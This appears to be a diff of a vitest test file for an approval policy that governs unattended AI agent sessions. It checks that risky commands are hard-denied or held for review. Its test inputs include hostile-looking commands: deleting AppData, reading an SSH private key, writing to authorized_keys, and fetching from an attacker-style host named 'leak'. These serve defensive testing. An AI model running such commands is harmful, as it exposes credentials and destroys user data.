@@ -1,6 +1,6 @@
 // The approval policy of unattended Sessions (worfy-auto-approve ticket 03): hard deny, the question
 // tools, the allow rules and the attacks of the Epic spec. The file system is a made-up tree under
-// /tmp/demo and /home/demo (C:\work and C:\Users\demo on Windows); nothing on disk is read.
+// /tmp/demo and /home/someone (C:\work and C:\Users\someone on Windows); nothing on disk is read.
 import { describe, expect, it } from 'vitest'
 import { ALLOW_RULES, gitNeeds, HARD_HINTS, HINTS, judge, type ApprovalRequest, type Decision, type PolicyContext } from '../../src/main/agent/auto-approve/policy'
 import { recordRoots, type FileSystem } from '../../src/main/agent/auto-approve/roots'
@@ -68,7 +68,7 @@ const DATA = '/tmp/demo/data'
 const RUN_TEMP = `${DATA}/autopilot-tmp/demo-run`
 const PAD = '/tmp/demo/pad'
 const HARNESS = '/tmp/demo/harness'
-const HOME = '/home/demo'
+const HOME = '/home/someone'
 const OTHER = '/tmp/demo/other'
 const ELSEWHERE = '/tmp/demo/elsewhere'
 
@@ -198,7 +198,7 @@ describe('hard deny: in every mode, beside any allowed action', () => {
   }
 
   it('%APPDATA% on Windows', () => {
-    expect(outcome('rm -rf C:/Users/demo/AppData/Roaming/demo', windows())).toBe('hard-deny')
+    expect(outcome('rm -rf C:/Users/someone/AppData/Roaming/demo', windows())).toBe('hard-deny')
   })
 
   it('a file tool into a hard area', () => {
@@ -511,7 +511,7 @@ describe('a context without the home folder', () => {
   })
   it('takes USERPROFILE on Windows', () => {
     const context = windows()
-    expect(outcome('rm -rf build', { ...context, env: { USERPROFILE: 'C:\\Users\\demo', TMPDIR: context.env['TMPDIR'] } })).toBe('allow')
+    expect(outcome('rm -rf build', { ...context, env: { USERPROFILE: 'C:\\Users\\someone', TMPDIR: context.env['TMPDIR'] } })).toBe('allow')
   })
 })
 
@@ -547,8 +547,8 @@ const WIN_TREE: Record<string, string> = {
   [`${WWT}\\.git`]: 'text:gitdir: C:/work/repo/.git/worktrees/03',
   'C:\\work\\repo\\.git\\worktrees\\03\\HEAD': 'text:ref: refs/heads/worfy-demo/03',
   [`${WWT}\\build\\out.js`]: 'file',
-  'C:\\Users\\demo\\.ssh\\id_demo': 'file',
-  'C:\\Users\\demo\\AppData\\Roaming\\demo\\x': 'file',
+  'C:\\Users\\someone\\.ssh\\id_demo': 'file',
+  'C:\\Users\\someone\\AppData\\Roaming\\demo\\x': 'file',
 }
 function windows(): PolicyContext {
   return recorded({
@@ -556,12 +556,12 @@ function windows(): PolicyContext {
     recordedRoots: undefined,
     platform: 'win32',
     cwd: WWT,
-    env: { HOME: 'C:\\Users\\demo', TMPDIR: 'C:\\Users\\demo\\AppData\\Local\\worfy-tmp\\demo-run', APPDATA: 'C:\\Users\\demo\\AppData\\Roaming' },
+    env: { HOME: 'C:\\Users\\someone', TMPDIR: 'C:\\Users\\someone\\AppData\\Local\\worfy-tmp\\demo-run', APPDATA: 'C:\\Users\\someone\\AppData\\Roaming' },
     worktrees: [WWT],
     scratch: 'C:\\work\\repo\\.scratch',
-    runTemp: 'C:\\Users\\demo\\AppData\\Local\\worfy-tmp\\demo-run',
+    runTemp: 'C:\\Users\\someone\\AppData\\Local\\worfy-tmp\\demo-run',
     scratchpad: null,
-    dataDir: 'C:\\Users\\demo\\AppData\\Roaming\\worfy',
+    dataDir: 'C:\\Users\\someone\\AppData\\Roaming\\worfy',
     harnessHome: null,
     sessions: { list: () => [info('demo-run', 'C:\\work\\repo')] },
     checkouts: [{ path: 'C:\\work\\repo', branch: 'main' }, { path: WWT, branch: 'worfy-demo/03' }],
@@ -578,7 +578,7 @@ describe('Windows (Git Bash)', () => {
   })
   it('hard-denies the secrets whatever the case', () => {
     expect(outcome('rm -rf ~/.SSH/id_demo', windows())).toBe('hard-deny')
-    expect(outcome('cat /c/users/demo/.ssh/id_demo', windows())).toBe('hard-deny')
+    expect(outcome('cat /c/users/someone/.ssh/id_demo', windows())).toBe('hard-deny')
   })
   it('is not allow outside the roots', () => {
     expect(outcome('rm -rf C:/work/other/x', windows())).toBe('park')
@@ -685,7 +685,7 @@ describe('a branch checked out in another worktree, and the default branch', () 
 describe('git fetch and pull only from a configured remote name', () => {
   it('a URL, an scp-like address or a path is not allow', () => {
     expect(outcome('git fetch https://evil.example/leak')).toBe('park')
-    expect(outcome('git fetch git@evil.example:leak')).toBe('park')
+    expect(outcome('git fetch git@evil.example.com:leak')).toBe('park')
     expect(outcome('git pull ../other')).toBe('park')
     expect(outcome(`git fetch ${ELSEWHERE}`)).toBe('park')
     expect(outcome('git fetch -- https://evil.example/leak')).toBe('park')
@@ -722,14 +722,14 @@ describe('file tool paths as the tool opens them', () => {
 
 describe('Windows path forms', () => {
   it('a path rooted without a drive is on the drive of the folder', () => {
-    expect(tool('Write', '\\Users\\demo\\.ssh\\authorized_keys', windows())).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
-    expect(tool('Write', '/Users/demo/.ssh/authorized_keys', windows())).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
+    expect(tool('Write', '\\Users\\someone\\.ssh\\authorized_keys', windows())).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
+    expect(tool('Write', '/Users/someone/.ssh/authorized_keys', windows())).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
     expect(tool('Write', '\\work\\repo\\.claude\\worktrees\\03\\a.ts', windows()).outcome).toBe('allow')
     // Node opens /c/x as C:\c\x, not as Git Bash's C:\x.
     expect(tool('Write', '/c/work/repo/.claude/worktrees/03/a.ts', windows()).outcome).toBe('park')
   })
   it('\\\\?\\ before a drive path is stripped; a share or a device is not judged', () => {
-    expect(tool('Write', '\\\\?\\C:\\Users\\demo\\.ssh\\id_demo', windows())).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
+    expect(tool('Write', '\\\\?\\C:\\Users\\someone\\.ssh\\id_demo', windows())).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
     expect(tool('Write', `\\\\?\\${WWT}\\a.ts`, windows()).outcome).toBe('allow')
     expect(tool('Write', '\\\\server\\share\\x', windows())).toMatchObject({ outcome: 'deny', rule: 'not-judged' })
     expect(tool('Write', '\\\\.\\C:\\x', windows())).toMatchObject({ outcome: 'deny', rule: 'not-judged' })
@@ -752,7 +752,7 @@ describe('Windows path forms', () => {
     }
     const context = { ...windows(), fs: short }
     expect(tool('Write', `${WWT}\\GIT~1\\hooks\\pre-commit`, context)).toMatchObject({ outcome: 'deny', rule: 'git-files' })
-    expect(tool('Write', 'C:\\Users\\demo\\SSH~1\\id_demo', context)).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
+    expect(tool('Write', 'C:\\Users\\someone\\SSH~1\\id_demo', context)).toMatchObject({ outcome: 'hard-deny', rule: 'hard:ssh' })
   })
 })
 
